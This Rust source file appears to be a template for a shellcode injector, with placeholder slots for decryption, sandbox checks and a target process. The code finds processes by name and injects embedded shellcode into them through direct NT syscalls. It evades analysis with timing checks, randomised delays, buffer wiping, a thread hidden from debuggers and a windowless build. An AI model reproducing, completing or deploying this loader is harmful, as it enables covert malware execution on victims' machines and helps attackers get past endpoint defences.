#![windows_subsystem = "windows"]
#![allow(non_snake_case)]

use std::include_bytes;
use std::ptr::null_mut;
use std::time::Instant;
use core::ffi::c_void;

use dyncvoke::dyncvoke_core::syscall;

use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
    PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};

type HANDLE = *mut c_void;

const PROCESS_ALL_ACCESS: u32 = 0x1FFFFF;
const THREAD_ALL_ACCESS: u32 = 0x1FFFFF;
const HIDE_FROM_DEBUGGER: u32 = 0x4;

#[repr(C)]
#[derive(Default)]
struct OBJECT_ATTRIBUTES {
    Length: u32,
    RootDirectory: HANDLE,
    ObjectName: *mut c_void,
    Attributes: u32,
    SecurityDescriptor: *mut c_void,
    SecurityQualityOfService: *mut c_void,
}

#[repr(C)]
struct CLIENT_ID {
    UniqueProcess: HANDLE,
    UniqueThread: HANDLE,
}

#[inline]
fn nt_success(s: i32) -> bool { s >= 0 }

{{IMPORTS}}

{{SANDBOX_IMPORTS}}

{{DECRYPTION_FUNCTION}}

{{STR_DECODER}}

{{API_RESOLVER}}

fn {{FN_FIND_PID}}(tar: &str) -> Vec<usize> {
    let mut dom: Vec<usize> = Vec::new();
    let tar_lower = tar.to_lowercase();

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return dom;
        }

        let mut entry: PROCESSENTRY32W = core::mem::zeroed();
        entry.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;

        if Process32FirstW(snapshot, &mut entry) != 0 {
            loop {
                let len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
                let name = String::from_utf16_lossy(&entry.szExeFile[..len]);
                if name.to_lowercase() == tar_lower {
                    dom.push(entry.th32ProcessID as usize);
                }
                if Process32NextW(snapshot, &mut entry) == 0 {
                    break;
                }
            }
        }

        CloseHandle(snapshot);
    }

    dom
}

fn {{FN_PAUSE}}(ms: i64) {
    let interval: i64 = -(ms * 10_000);
    let _ = syscall!("NtDelayExecution", 0u32, &interval as *const i64);
}

fn check_environment() -> bool {
    let start = Instant::now();
    {{FN_PAUSE}}(3000);
    start.elapsed().as_millis() >= 2500
}

fn wipe(buf: &mut Vec<u8>) {
    for b in buf.iter_mut() {
        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
    }
    buf.clear();
}

fn {{FN_INJECT}}(mut buf: Vec<u8>, tar: usize) {
    let mut process_handle = tar as HANDLE;
    let mut oa = OBJECT_ATTRIBUTES::default();
    let mut ci = CLIENT_ID {
        UniqueProcess: process_handle,
        UniqueThread: null_mut(),
    };

    unsafe {
        let s = syscall!("NtOpenProcess",
            &mut process_handle as *mut HANDLE,
            PROCESS_ALL_ACCESS,
            &mut oa as *mut OBJECT_ATTRIBUTES,
            &mut ci as *mut CLIENT_ID
        ).unwrap() as i32;
        if !nt_success(s) { return; }

        {{FN_PAUSE}}({{JITTER_1}});
        {{NT_DELAY_STEP}}

        let mut base: *mut c_void = null_mut();
        let mut size: usize = buf.len();
        let s = syscall!("NtAllocateVirtualMemory",
            process_handle,
            &mut base as *mut *mut c_void,
            0usize,
            &mut size as *mut usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        ).unwrap() as i32;
        if !nt_success(s) { return; }

        {{FN_PAUSE}}({{JITTER_2}});
        {{NT_DELAY_STEP}}

        let buf_len = buf.len();
        let mut written: usize = 0;
        let s = syscall!("NtWriteVirtualMemory",
            process_handle,
            base,
            buf.as_mut_ptr() as *mut c_void,
            buf_len,
            &mut written as *mut usize
        ).unwrap() as i32;
        if !nt_success(s) { return; }

        wipe(&mut buf);
        {{FN_PAUSE}}({{JITTER_3}});
        {{NT_DELAY_STEP}}

        let mut old_perms = PAGE_READWRITE;
        let mut psize = buf_len;
        let s = syscall!("NtProtectVirtualMemory",
            process_handle,
            &mut base as *mut *mut c_void,
            &mut psize as *mut usize,
            PAGE_EXECUTE_READ,
            &mut old_perms as *mut u32
        ).unwrap() as i32;
        if !nt_success(s) { return; }

        {{FN_PAUSE}}({{JITTER_4}});
        {{NT_DELAY_STEP}}
        {{NT_DELAY_FINAL}}

        let mut thread_handle: *mut c_void = null_mut();
        let _ = syscall!("NtCreateThreadEx",
            &mut thread_handle as *mut *mut c_void,
            THREAD_ALL_ACCESS,
            null_mut::<c_void>(),
            process_handle,
            base,
            null_mut::<c_void>(),
            HIDE_FROM_DEBUGGER,
            0usize,
            0usize,
            0usize,
            null_mut::<c_void>()
        );
    }
}

fn main() {
    {{NT_DELAY_AT_START}}
    {{SANDBOX}}

    if !check_environment() { return; }

    let tar: &str = "{{TARGET_PROCESS}}";

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = buf.to_vec();

    {{MAIN}}

    let list: Vec<usize> = {{FN_FIND_PID}}(tar);
    if !list.is_empty() {
        for i in &list {
            {{FN_INJECT}}(vec.clone(), *i);
        }
    }
}

{{DLL_MAIN}}